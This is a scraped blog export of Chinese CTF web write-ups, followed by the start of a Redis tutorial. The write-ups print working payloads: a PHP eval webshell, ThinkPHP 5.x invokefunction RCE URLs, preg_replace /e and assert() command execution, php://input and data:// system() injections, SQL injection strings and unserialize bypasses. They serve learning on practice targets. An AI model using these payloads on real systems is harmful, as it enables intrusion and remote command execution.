php://filter使用php://filter/read=convert.base64-encode/recource=[payload]来写入file参数 1?page=php://filter/convert.base64-encode/resource=index.php 我们即看到了index.php的源码，接下来进行代码审计。 1234567891011121314151617181920212223242526272829303132333435363738394041&lt;?php$page = $_GET[$page];if (isset($page)) &#123; if (ctype_alnum($page)) &#123; echo $page; die(); &#125; else &#123; if (strpos($page, 'input') &gt; 0) &#123; die(); &#125; if (strpos($page, 'ta:text') &amp;&amp; 0) &#123; die(); &#125; if (strpos($page, 'text') &amp;&amp; 0) &#123; die(); &#125; if ($page === 'index.php') &#123; die('Ok'); &#125; include($page); die(); &#125;&#125;if ($_SERVER['HTTP_X_FORWARDED_FOR'] === '127.0.0.1') &#123; echo \"&lt;br --&gt;Welcome My Admin ! &lt;br&gt;\"; $pattern = $_GET[$pat]; $replacement = $_GET[$rep]; $subject = $_GET[$sub]; if (isset($pattern) &amp;&amp; isset($replacement) &amp;&amp; isset($subject)) &#123; preg_replace($pattern, $replacement, $subject); &#125; else &#123; die(); &#125;&#125; 看底下那段代码，需要我们使用X-Forwarded-For定向为127.0.0.1，且这里有一个字符串匹配函数。 preg_replacephp的字符串匹配有个严重的问题： 当匹配的模式(pattern)包含’\\\\e’时，如果匹配的字符串(subject)与模式(pattern)匹配，则执行$replacement字符串代码 1X-Forwarded-For: 127.0.0.1 123pat=/a/e&amp;rep=system(&apos;ls&apos;)&amp;sub=&quot;a&quot;pat=/a/e&amp;rep=system(&apos;cd+s3chahahaDir%26%26ls&apos;)pat=/a/e&amp;rep=system(&apos;cd+s3chahahaDir/flag%26%26cat+flag.php&apos;)&amp;sub=&quot;a&quot; 在php的system()命令中，可以在字符串中输入多个命令，使用&amp;&amp; =&gt; %26%26拼接。 FlatScience首先使用dirsearch扫一遍，发现robots.txt login.php admin.php三个重要路由，进入robogs.txt康康，里面就是login.php和admin.php。 分别进入两个路由，发现login中是任意用户，admin中仅限用户名为admin，首先从login下手看看。 发现可以进行SQL注入，使用sqlmap，显示数据库为SQLite。 对SQLite尝试注入，之后陷入了短暂的僵局。 接着偶然间查看了下HTML，发现了?debug参数，输入url居然返回了php代码，开始审计php： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869&lt;?phpob_start();?&gt;&lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 4.01//EN&quot;&gt;&lt;html&gt;&lt;head&gt;&lt;style&gt;blockquote &#123; background: #eeeeee; &#125;h1 &#123; border-bottom: solid black 2px; &#125;h2 &#123; border-bottom: solid black 1px; &#125;.comment &#123; color: darkgreen; &#125;&lt;/style&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=iso-8859-1&quot;&gt;&lt;title&gt;Login&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;div align=right class=lastmod&gt;Last Modified: Fri Mar 31:33:7 UTC 1337&lt;/div&gt;&lt;h1&gt;Login&lt;/h1&gt;Login Page, do not try to hax here plox!&lt;br&gt;&lt;form method=&quot;post&quot;&gt; ID:&lt;br&gt; &lt;input type=&quot;text&quot; name=&quot;usr&quot;&gt; &lt;br&gt; Password:&lt;br&gt; &lt;input type=&quot;text&quot; name=&quot;pw&quot;&gt; &lt;br&gt;&lt;br&gt; &lt;input type=&quot;submit&quot; value=&quot;Submit&quot;&gt;&lt;/form&gt;&lt;?phpif(isset($_POST[&apos;usr&apos;]) &amp;&amp; isset($_POST[&apos;pw&apos;]))&#123; $user = $_POST[&apos;usr&apos;]; $pass = $_POST[&apos;pw&apos;]; $db = new SQLite3(&apos;../fancy.db&apos;); $res = $db-&gt;query(&quot;SELECT id,name from Users where name=&apos;&quot;.$user.&quot;&apos; and password=&apos;&quot;.sha1($pass.&quot;Salz!&quot;).&quot;&apos;&quot;); if($res)&#123; $row = $res-&gt;fetchArray(); &#125; else&#123; echo &quot;&lt;br&gt;Some Error occourred!&quot;; &#125; if(isset($row[&apos;id&apos;]))&#123; setcookie(&apos;name&apos;,&apos; &apos;.$row[&apos;name&apos;], time() + 60, &apos;/&apos;); header(&quot;Location: /&quot;); die(); &#125;&#125;if(isset($_GET[&apos;debug&apos;]))highlight_file(&apos;login.php&apos;);?&gt;&lt;!-- TODO: Remove ?debug-Parameter! --&gt;&lt;hr noshade&gt;&lt;address&gt;Flux Horst (Flux dot Horst at rub dot flux)&lt;/address&gt;&lt;/body&gt; 我们发现了变量在SQL语句中的引入方式与password的加密方式，并且发现注入数据(name)的结果会存入cookie中。 SQLite表接着尝试注入数据： 1234567891011usr=1&apos; union select 1,sql from sqlite_master where type=&apos;table&apos; and name=&apos;Users&apos;--&amp;pw=1=&gt; CREATE+TABLE+Users%28id+int+primary+key%2Cname+varchar%28255%29%2Cpassword+varchar%28255%29%2Chint+varchar%28255%29%29=&gt;CREATE TABLE Users(id int primary key,name varchar(255),password varchar(255),hint varchar(255))usr=1&apos; union select 1,hint from Users (where id &gt; 1[,2,...]) --&amp;pw=1=&gt;+my+fav+word+in+my+fav+paper%3F%21+my+love+is%E2%80%A6%3F+the+password+is+password 最后发现，要求将所有的论文下载下来，挨个遍历单词，将所有单词按照sha1(word + &quot;Salz!&quot;)加密，挨个注入admin.php。 最后的脚本和解题我没看，我只知道单词是ThinJerboa，这里出题个人认为实在是太无趣了…","tags":[{"name":"ctf-web","slug":"ctf-web","permalink":"https://v25bh145.github.io/tags/ctf-web/"},{"name":"CTF笔记-WEB攻防","slug":"CTF笔记-WEB攻防","permalink":"https://v25bh145.github.io/tags/CTF%E7%AC%94%E8%AE%B0-WEB%E6%94%BB%E9%98%B2/"}]},{"title":"CTF笔记-WEB攻防-05","date":"2020-10-13T16:00:00.000Z","path":"2020/10/14/coding/ctf/ctf笔记-05/","text":"此题解系写ctf笔记-08之时熬夜所补，所以篇幅可能略精简，望见谅。 NewsCenter首先用dirsearch扫了一遍，什么也没发现，robots.txt也是空的。 接着尝试使用单引号闭合搜索框，成功，考虑SQL注入。 使用sqlmap，搞定。 1python sqlmap.py -r postTmp.txt -D news -T secret_table -C fl4g --dump upload1看似为webshell上传，上传一个php: 1&lt;?php eval($_POST[\"awa\"]); ?&gt;php 提示需要使用图片上传，考虑是前端防护，直接打开浏览器调试把”上传”按钮的disable样式去掉，得以上传。 之后使用菜刀连接，地址为网页返回的上传文件路径，后面的口令填上传的变量名 ($_POST[“awa”]则为awa) 成功注入后即可随心所欲访问文件，当然flag也在里面。 mfw首先使用dirsearch进行目录爆破，哦吼，发现一堆.git文件，考虑git泄露。 使用githacker进行攻击，githacker的具体食用方法见ctf笔记-08中。(原本此处用的是githack，但是其由于不能恢复版本，不推荐使用) 查看版本，确定只有一个版本之后，开始审计这个版本的代码。 首先查看flag.php，嗯，在这个git的版本中没东西，看起来需要我们访问现有的flag.php才行。 开始审计index.php: 1234567891011121314151617&lt;?phpif (isset($_GET['page'])) &#123; $page = $_GET['page'];&#125; else &#123; $page = \"home\";&#125;$file = \"templates/\" . $page . \".php\";// I heard '..' is dangerous!assert(\"strpos('$file', '..') === false\") or die(\"Detected hacking attempt!\");// TODO: Make this look niceassert(\"file_exists('$file')\") or die(\"That file doesn't exist!\");?&gt; 需要想办法绕过两个’.’， assert()这道题的漏洞出在assert()中，因为assert()可以执行字符串。 解法 ```payload%27.system(“cat%20./templates/flag.php”).%27=&gt;‘.system(“cat ./templates/flag.php”).’=&gt;file_exists(‘templates/‘.system(“cat ./templates/flag.php”).’.php’)12345672. ```payload %27)%20or%20phpinfo();%23 # &apos;#&apos;号一定要进行url编码，否则会被忽略掉！ =&gt; &apos;) or phpinfo();#&apos; =&gt; file_exists(&apos;templates/&apos;) or phpinfo();#.php&apos;) flag在HTML的注释中","tags":[{"name":"ctf-web","slug":"ctf-web","permalink":"https://v25bh145.github.io/tags/ctf-web/"},{"name":"CTF笔记-WEB攻防","slug":"CTF笔记-WEB攻防","permalink":"https://v25bh145.github.io/tags/CTF%E7%AC%94%E8%AE%B0-WEB%E6%94%BB%E9%98%B2/"}]},{"title":"CTF笔记-WEB攻防-04","date":"2020-10-11T14:30:00.000Z","path":"2020/10/11/coding/ctf/ctf笔记-04/","text":"NaNNaNNaNNaN-Batman下载附件，打开看到了一堆乱码，看着像是js的审计题 1(可能是由于这段乱码的问题，这篇.md中的汉字全都变成了乱码，所以这里的东西删去了) =&gt; 进行了一波完形填空 仔细对着代码看了看，发现代码是有有序的结构的： 1234_='function $() &#123;/*乱码*/&#125;';for(Y in $='/*乱码*/') with(_.split($[Y]))_=join(pop());eval(_) 于是将eval换成了console，输出了变量_的值： 12345678910111213141516171819202122console.log(_)function $() &#123; var e = document.getElementById(\"c\").value; if (e.length == 16) if (e.match(/^be0f23/) != null) if (e.match(/233ac/) != null) if (e.match(/e98aa$/) != null) if (e.match(/c7be9/) != null) &#123; var t = [\"fl\", \"s_a\", \"i\", \"e&#125;\"]; var n = [\"a\", \"_h0l\", \"n\"]; var r = [\"g&#123;\", \"e\", \"_0\"]; var i = [\"it'\", \"_\", \"n\"]; var s = [t, n, r, i]; for (var o = 0; o &lt; 13; ++o) &#123; document.write(s[o % 4][0]); s[o % 4].splice(0, 1); &#125; &#125;&#125;document.write('&lt;input id=\"c\"&gt;&lt;button onclick=$()&gt;Ok&lt;/button&gt;');delete _; 这里看到里面有fl a g之类的东西，直接把里面的东西扒下来修改，按格式输出： 1234567891011121314var t = [\"fl\", \"s_a\", \"i\", \"e&#125;\"];var n = [\"a\", \"_h0l\", \"n\"];var r = [\"g&#123;\", \"e\", \"_0\"];var i = [\"it'\", \"_\", \"n\"];var s = [t, n, r, i];var res = \"\";for (var o = 0; o &lt; 13; ++o) &#123; res += s[o % 4][0]; s[o % 4].splice(0, 1);&#125;console.log(res); web2是一道php的审计解密题 12345678910111213141516171819&lt;?php$miwen=\"a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws\";function encode($str)&#123; $_o=strrev($str); // echo $_o; for($_0=0;$_0&lt;strlen($_o);$_0++)&#123; $_c=substr($_o,$_0,1); $__=ord($_c)+1; $_c=chr($__); $_=$_.$_c; &#125; return str_rot13(strrev(base64_encode($_)));&#125;highlight_file(__FILE__);?&gt; 这段代码大意为： 反向输出str到$_o中 顺序遍历$_o，将每一位的ascii值+1之后赋予$_ 将$_按顺序base64加密，反转，rot13加密，输出 我们构建出反向解密： 123456789$miwen=\"a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws\";$miwen = base64_decode(strrev(str_rot13($miwen)));for($_0=0;$_0&lt;strlen($miwen);$_0++)&#123; $_c=substr($miwen,$_0,1); $__=ord($_c)-1; $_c=chr($__); $_=$_.$_c; &#125;echo strrev($_); PHP2这道题也是php代码审计，不过入口文件很怪，普通的dirsearch搜索不出来，在index.phps 123456789101112131415&lt;?phpif(\"admin\"===$_GET[id]) &#123; echo(\"&lt;p&gt;not allowed!&lt;/p&gt;\"); exit();&#125;$_GET[id] = urldecode($_GET[id]);if($_GET[id] == \"admin\")&#123; echo \"&lt;p&gt;Access granted!&lt;/p&gt;\"; echo \"&lt;p&gt;Key: xxxxxxx &lt;/p&gt;\";&#125;?&gt;Can you anthenticate to this website? 很简单，是之前在ctf笔记-03中的warmup的下位替代，直接将admin进行url二次编码即可通过验证： 1?id=%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65","tags":[{"name":"ctf-web","slug":"ctf-web","permalink":"https://v25bh145.github.io/tags/ctf-web/"},{"name":"CTF笔记-WEB攻防","slug":"CTF笔记-WEB攻防","permalink":"https://v25bh145.github.io/tags/CTF%E7%AC%94%E8%AE%B0-WEB%E6%94%BB%E9%98%B2/"}]},{"title":"CTF笔记-WEB攻防-03","date":"2020-10-11T13:00:00.000Z","path":"2020/10/11/coding/ctf/ctf笔记-03/","text":"supersqli sql注入题目 手写先试试万能的单引号，果然报错了： 1error 1064 : You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &apos;&apos;1&apos;&apos;&apos; at line 1 注意一下，第一个’和最后一个’是起标识位置作用的,就是一个单引号,所以原语句是’1’(单引号闭合) 尝试 联合注入payload: 11&apos;+union+select+database()+--+ 返回了一段这样的包含正则匹配的php代码，说明不可行： 1return preg_match(&quot;/select|update|delete|drop|insert|where|\\./i&quot;,$inject); 堆叠注入 这里先引入一个堆叠注入的方法：用分号闭合原语句，在后面输入任意语句使mysql批量执行。 关于堆叠注入(发现写的很好，搬过来)： 1虽然我们前面提到了堆叠查询可以执行任意的sql语句，但是这种注入方式并不是十分的完美的。在我们的web系统中，因为代码通常只返回一个查询结果，因此，堆叠注入第二个语句产生错误或者结果只能被忽略，我们在前端界面是无法看到返回结果的。因此，在读取数据时，我们建议使用union（联合）注入。同时在使用堆叠注入之前，我们也是需要知道一些数据库相关信息的，例如表名，列名等信息。 在联合注入碰到钉子之后，试图尝试堆叠注入，期望服务器可以返回多行sql语句运行的结果： 11&apos;; show databases; 1234567891011121314151617181920212223242526272829array(1) &#123; [0]=&gt; string(11) &quot;ctftraining&quot;&#125;array(1) &#123; [0]=&gt; string(18) &quot;information_schema&quot;&#125;array(1) &#123; [0]=&gt; string(5) &quot;mysql&quot;&#125;array(1) &#123; [0]=&gt; string(18) &quot;performance_schema&quot;&#125;array(1) &#123; [0]=&gt; string(9) &quot;supersqli&quot;&#125;array(1) &#123; [0]=&gt; string(4) &quot;test&quot;&#125; 进入ctftraining看看，查查里面的表和字段： 1231&apos;; show tables from ctftraining;1&apos;; show columns from FLAG_TABLE from ctftraining; 这里的字段其实是获取不到的，我们无法使用可以绕过正则匹配的命令来获取到字段 再进所在的数据库看看： 1231&apos;; show tables;1&apos;; show columns from words;1&apos;; show columns from `1919810931114514`; 需要注意的是，遇到以数字为表名的表，查询时需要加反引号 12345678910111213141516array(2) &#123; [0]=&gt; string(1) &quot;1&quot; [1]=&gt; string(7) &quot;hahahah&quot;&#125;array(1) &#123; [0]=&gt; string(16) &quot;1919810931114514&quot;&#125;array(1) &#123; [0]=&gt; string(5) &quot;words&quot;&#125; 12345678910111213141516171819202122232425262728array(6) &#123; [0]=&gt; string(2) &quot;id&quot; [1]=&gt; string(7) &quot;int(10)&quot; [2]=&gt; string(2) &quot;NO&quot; [3]=&gt; string(0) &quot;&quot; [4]=&gt; NULL [5]=&gt; string(0) &quot;&quot;&#125;array(6) &#123; [0]=&gt; string(4) &quot;data&quot; [1]=&gt; string(11) &quot;varchar(20)&quot; [2]=&gt; string(2) &quot;NO&quot; [3]=&gt; string(0) &quot;&quot; [4]=&gt; NULL [5]=&gt; string(0) &quot;&quot;&#125; 1234567891011121314array(6) &#123; [0]=&gt; string(4) &quot;flag&quot; [1]=&gt; string(12) &quot;varchar(100)&quot; [2]=&gt; string(2) &quot;NO&quot; [3]=&gt; string(0) &quot;&quot; [4]=&gt; NULL [5]=&gt; string(0) &quot;&quot;&#125; 发现碰钉子了：如何不用select查询数据呢？ =&gt;可以使用rename (alter)命令来输出所想要的表中的字段,也就是偷梁换柱 11&apos;;rename tables `words` to `words1`; rename tables `1919810931114514` to `words`; 现在直接查询id=’1’,发现报错： 1error 1054 : Unknown column &apos;id&apos; in &apos;where clause&apos; 所以我们所伪造的words表还需要一个名为id的字段，我们可以改变字段为id，也可以添加新字段 12ALTER TABLE exampleTable change exampleFiledFrom exampleFiledTo exampleType;ALTER TABLE exampleTable ADD exampleField exampleType; #CHARACTER SET utf8 COLLATE utf8_unicode_ci DEFAULT &apos;&apos; COMMENT &apos;&apos;; 1’; alter table words add id VARCHAR(100); 突然发现环境已经被我们整坏了，因为对id的查询已经失效了，所以只能重启环境来完成实验了() 正确的方法应该是，rename方法与alter方法在同一批次执行，才能保证where id = ‘1’有效。 payload 1:1231&apos;;rename tables `words` to `words1`; rename tables `1919810931114514` to `words`;alter table words add id VARCHAR(100) default 1;1 1231&apos;;rename tables `words` to `words1`; rename tables `1919810931114514` to `words`;alter table words add id VARCHAR(100) default 1;1&apos;; or 1=1; payload 2:1231&apos;;rename tables `words` to `words1`; rename tables `1919810931114514` to `words`;alter table words change flag id VARCHAR(100);1&apos;; or 1=1; sqlmap如果需要使用脚本，脚本的查询很耗时且只使用脚本几乎不可行。 在使用--dbs查询时，只能获取到一个可用supersqli数据库，并且在使用--tabkes查询时，其使用的是暴力查表查询，common常用表一个表也识别不出来，更不用说那一长串发臭的数字，根本匹配不到。 ics-06进入之后是一个dashbord页面，首先dirsearch，发现了index.php，并且总是会重定向到id=1，很奇怪 这道题的解法更离谱，需要使用burp暴力枚举id，会发现id=2333时数据量不一样，出现flag…… warmup进入是个大滑稽(滑稽) 使用dirsearch来一下： 12345678910111213[20:10:25] 403 - 306B - /.htaccess.bak1[20:10:25] 403 - 306B - /.htaccess.save[20:10:25] 403 - 306B - /.htaccess.orig[20:10:25] 403 - 308B - /.htaccess.sample[20:10:25] 403 - 304B - /.htaccessBAK[20:10:25] 403 - 304B - /.htaccessOLD[20:10:25] 403 - 305B - /.htaccessOLD2[20:10:25] 403 - 303B - /.httr-oauth[20:10:34] 200 - 354B - /index.php[20:10:34] 200 - 354B - /index.php/login/[20:10:38] 403 - 305B - /server-status[20:10:38] 403 - 306B - /server-status/[20:10:38] 200 - 8KB - /source.php 进入source.php，看到了php源码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&lt;?php highlight_file(__FILE__); class emmm &#123; public static function checkFile(&amp;$page) &#123; $whitelist = [\"source\"=&gt;\"source.php\",\"hint\"=&gt;\"hint.php\"]; if (! isset($page) || !is_string($page)) &#123; echo \"you can't see it\"; return false; &#125; if (in_array($page, $whitelist)) &#123; return true; &#125; $_page = mb_substr( $page, 0, mb_strpos($page . '?', '?') ); if (in_array($_page, $whitelist)) &#123; return true; &#125; $_page = urldecode($page); $_page = mb_substr( $_page, 0, mb_strpos($_page . '?', '?') ); if (in_array($_page, $whitelist)) &#123; return true; &#125; echo \"you can't see it\"; return false; &#125; &#125; if (! empty($_REQUEST['file']) &amp;&amp; is_string($_REQUEST['file']) &amp;&amp; emmm::checkFile($_REQUEST['file']) ) &#123; include $_REQUEST['file']; exit; &#125; else &#123; echo \"&lt;br&gt;&lt;img src=\\\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\\\" /&gt;\"; &#125; ?&gt; 进入hint.php，告诉我们flag在ffffllllaaaagggg中 审计代码，发现需要让其访问到flag的所在文件，我们需要构造这样的payload: 1?file=(source.php or hint.php)(url二次编码的&apos;?&apos; =&gt; %253F)(flag文件的位置) url二次编码：在接收请求时，会自动进行一次url解码，php代码中又内置了一行手动解码，因此通过需要二次编码。 关于flag文件的位置：私认为题出的不好，flag文件于../../../../../ffffllllaaaagggg，且只提示了文件名，没有路径，需要自己暴力../去找。","tags":[{"name":"ctf-web","slug":"ctf-web","permalink":"https://v25bh145.github.io/tags/ctf-web/"},{"name":"CTF笔记-WEB攻防","slug":"CTF笔记-WEB攻防","permalink":"https://v25bh145.github.io/tags/CTF%E7%AC%94%E8%AE%B0-WEB%E6%94%BB%E9%98%B2/"}]},{"title":"CTF笔记-WEB攻防-02","date":"2020-10-01T13:30:00.000Z","path":"2020/10/01/coding/ctf/ctf笔记-02/","text":"Web_php_unserialize(题外话)这一题觉得好难呀 访问端口: output: 123456789101112131415161718192021222324252627&lt;?php class Demo &#123; private $file = 'index.php'; public function __construct($file) &#123; $this-&gt;file = $file; &#125; function __destruct() &#123; echo @highlight_file($this-&gt;file, true); &#125; function __wakeup() &#123; if ($this-&gt;file != 'index.php') &#123; //the secret is in the fl4g.php $this-&gt;file = 'index.php'; &#125; &#125; &#125;if (isset($_GET['var'])) &#123; $var = base64_decode($_GET['var']); if (preg_match('/[oc]:\\d+:/i', $var)) &#123; die('stop hacking!'); &#125; else &#123; @unserialize($var); &#125; &#125; else &#123; highlight_file(\"index.php\"); &#125; ?&gt; var 我们需要get传参var，var的值就是序列化后的类的base64编码 在处理var时用到了正则匹配检测，含义就是匹配 o或c之后跟数字加冒号的格式 Demo 看到了三个方法，构造器不用管，从注释看到了目标文件fl4g.php __destruct会将输入的文件输出 __wakeup则是一个防护用函数，将file强制改为index.php，因此我们需要绕过__wakeup方法 序列化123O:4:\"Demo\":1:&#123;s:10:\"Demofile\";s:8:\"fl4g.php\";&#125;=&gt;绕过正则 O:+4:\"Demo\":1:&#123;s:10:\"Demofile\";s:8:\"fl4g.php\";&#125;=&gt;绕过__wakeup() O:+4:\"Demo\":2:&#123;s:10:\"Demofile\";s:8:\"fl4g.php\";&#125; base64加密123456789101112131415161718192021&lt;?phpclass Demo &#123; private $file = &apos;index.php&apos;; public function __construct($file) &#123; $this-&gt;file = $file; &#125; function __destruct() &#123; echo @highlight_file($this-&gt;file, true); &#125; function __wakeup() &#123; if ($this-&gt;file != &apos;index.php&apos;) &#123; //the secret is in the fl4g.php $this-&gt;file = &apos;index.php&apos;; &#125; &#125; &#125;$b = new Demo(&apos;fl4g.php&apos;);$c = serialize($b);$c = str_replace(&quot;O:4&quot;, &quot;O:+4&quot;, $c);$c = str_replace(&quot;:1:&#123;&quot;, &quot;:2:&#123;&quot;, $c);echo base64_encode($c); output 1TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ== url 1http://220.249.52.133:36436/?var=TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ== 反思踩坑=&gt;base64我们如果使用网页上的base64加密工具，则会出现忽略空格的问题: 12base64加密工具：TzorNDoiRGVtbyI6Mjp7czoxMDoiRGVtb2ZpbGUiO3M6ODoiZmw0Zy5waHAiO30=php自行加密：TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ== 在使用base64加密时，一定要构造原生php，切记使用加密工具! php_rcerce访问端口，得到了tp的默认首页 这里需要使用tp的 5.0-5.0.24 版本和 5.1.0-5.1.30 版本的rce漏洞进行攻击 攻击方法 =&gt; 这篇博客写的有点问题，我们需要将thinkapp换为think\\app url1http://220.249.52.133:58615/?s=index/think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=find / -name &quot;flag*&quot; 在输出发现/flag文件，访问它 1http://220.249.52.133:58615/?s=index/think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cat /flag 得到了flag Web_php_include访问端口，得到了php代码： 123456789&lt;?phpshow_source(__FILE__);echo $_GET['hello'];$page=$_GET['page'];while (strstr($page, \"php://\")) &#123; $page=str_replace(\"php://\", \"\", $page);&#125;include($page);?&gt; 这题解法很多样的样子，看看wp能得到很多操作 大小写绕过php://这里php://不分大小写，代码中只做了小写判定，所以我们可以大小写绕过 burp拦截头信息 — proxy — interccept =&gt;(获取到头信息后) Actions — send to repeater 123456789GET / HTTP/1.1Host: 220.249.52.133:40787Cache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Connection: close 修改头信息123456789101112POST /?page=Php://input HTTP/1.1Host: 220.249.52.133:40787Cache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Connection: closeContent-Length: 22&lt;?php system(&quot;ls&quot;); ?&gt; output 123fl4gisisish3r3.phpindex.phpphpinfo.php 访问fl4gisisish3r3.php： 123456789101112POST /?page=Php://input HTTP/1.1Host: 220.249.52.133:40787Cache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Connection: closeContent-Length: 42&lt;?php system(&quot;cat fl4gisisish3r3.php&quot;); ?&gt; 得到了flag 使用其他协议data://修改头信息(拦截见上)12http://220.249.52.133:40787/?page=data://text/plain;base64,%0CPD9waHAgc3lzdGVtKCdscycpOyA/Pg== # &lt;?php system(&quot;ls&quot;); ?&gt; 12http://220.249.52.133:40787/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmw0Z2lzaXNpc2gzcjMucGhwJyk7ID8+# &lt;?php system(&quot;cat fl4gisisish3r3.php&quot;); ?&gt; 这时候出问题了 url中的特殊符号我们需对url中的特殊符号(+, (空格), )进行url编码来传数据 12http://220.249.52.133:40787/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmw0Z2lzaXNpc2gzcjMucGhwJyk7ID8%2b# &lt;?php system(&quot;cat fl4gisisish3r3.php&quot;); ?&gt; 在html注释get到了flag","tags":[{"name":"ctf-web","slug":"ctf-web","permalink":"https://v25bh145.github.io/tags/ctf-web/"},{"name":"CTF笔记-WEB攻防","slug":"CTF笔记-WEB攻防","permalink":"https://v25bh145.github.io/tags/CTF%E7%AC%94%E8%AE%B0-WEB%E6%94%BB%E9%98%B2/"}]},{"title":"CTF笔记-WEB攻防-01","date":"2020-10-01T13:25:00.000Z","path":"2020/10/01/coding/ctf/ctf笔记-01/","text":"写在前面： 此笔记系个人(初学者)整理思路之用，没有想过能起到供各位参考学习的用处。 尽可能按照攻防世界的题目顺序来。 如果各位从我的文章发现了什么问题或者想和我探tan讨tan探ren讨sheng，欢迎联系我呀~ baby_web​ 进入页面之后，重定向到了1.php，认为有问题，因此使用了网页搜索工具dirsearch dirsearch1python dirsearch.py -u http://220.249.52.133:40885 -e* output: 12345678910111213[19:22:07] 403 - 306B - /.htaccess.bak1[19:22:07] 403 - 306B - /.htaccess.orig[19:22:07] 403 - 308B - /.htaccess.sample[19:22:07] 403 - 306B - /.htaccess.save[19:22:07] 403 - 304B - /.htaccessBAK[19:22:07] 403 - 304B - /.htaccessOLD[19:22:07] 403 - 305B - /.htaccessOLD2[19:22:07] 403 - 303B - /.httr-oauth[19:22:15] 200 - 11B - /1.php[19:23:08] 302 - 17B - /index.php -&gt; 1.php[19:23:08] 302 - 17B - /index.php/login/ -&gt; 1.php[19:23:30] 403 - 305B - /server-status[19:23:30] 403 - 306B - / 发现了奇怪的302信息：/index，去路由到/index康康，发现302的response中有flag，结题 Training-WWW-Robots​ 看题目知道，是关于robots.txt的,因此我们可以直接访问robots.txt路由/robots.txt robots.txt​ output: 123456User-agent: *Disallow: /fl0g.phpUser-agent: YandexDisallow: * 看到了类似于flag的路由，过去直接发现路由 unserialize3​ 根据题目来看，这题是关于反序列化的 ​ 访问地址： 123456class xctf&#123;public $flag = '111';public function __wakeup()&#123;exit('bad requests');&#125;?code= ​ 发现这php语法错误，少一括号看到了?code=，察觉到是get传参code，应该是传序列化的类，之后番序列化出flag ​ 我们把这个类序列化： 12345678910&lt;?phpclass xctf&#123; public $flag = '111'; public function __wakeup()&#123; exit('bad requests'); &#125;&#125;$b = new xctf();$c = serialize($b);echo $c; output 1O:4:\"xctf\":1:&#123;s:4:\"flag\";s:3:\"111\";&#125; 我们直接写入code参数中: 1http://220.249.52.133:32505/?code=O:4:%22xctf%22:1:&#123;s:4:%22flag%22;s:3:%22111%22;&#125; output 1bad requests 这时意识到了，经过了反序列化经过了__wakeup()魔术方法，导致了bad requests被打印出来。 如何绕过php反序列化的__wakeup()方法呢？ 在反序列化的操作中，如果给出的参数数量和真正的参数数量对不上，则会跳过__wakeup()方法 例如，O:4:&quot;xctf&quot;:1:{s:4:&quot;flag&quot;;s:3:&quot;111&quot;;},我们若改成：O:4:&quot;xctf&quot;:2:{s:4:&quot;flag&quot;;s:3:&quot;111&quot;;}，给出的参数数量为2，可实际只有一个，就会绕过导致__wakeup()方法 重新路由： 1http://220.249.52.133:32505/?code=O:4:%22xctf%22:2:&#123;s:4:%22flag%22;s:3:%22111%22;&#125; 拿到了flag","tags":[{"name":"ctf-web","slug":"ctf-web","permalink":"https://v25bh145.github.io/tags/ctf-web/"},{"name":"CTF笔记-WEB攻防","slug":"CTF笔记-WEB攻防","permalink":"https://v25bh145.github.io/tags/CTF%E7%AC%94%E8%AE%B0-WEB%E6%94%BB%E9%98%B2/"}]},{"title":"12.Redis","date":"2020-09-29T11:21:24.000Z","path":"2020/09/29/coding/nodeJs/12. redis/","text":"Redis1. 介绍(抄自菜鸟教程) REmote DIctionary Server(Redis) 是一个由Salvatore Sanfilippo写的key-value存储系统。 Redis是一个开源的使用ANSI C语言编写、遵守BSD协议、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。 它通常被称为数据结构服务器，因为值（value）可以是 字符串(String), 哈希(Hash), 列表(list), 集合(sets) 和 有序集合(sorted sets)等类型。 特点 基于内存，可持久化 &gt; 快速 可存键值对，数据结构 &gt; 算法透明(开源) 具有多语言支持 2. 数据类型 - 控制台使用演示 更多指令见菜鸟教程 string12345set key valueget keydel key 一个键最大能存储 512MB。 hash1234567hset obj key value //redis[&quot;obj&quot;].key = valuehmset obj key1 value1 [key2 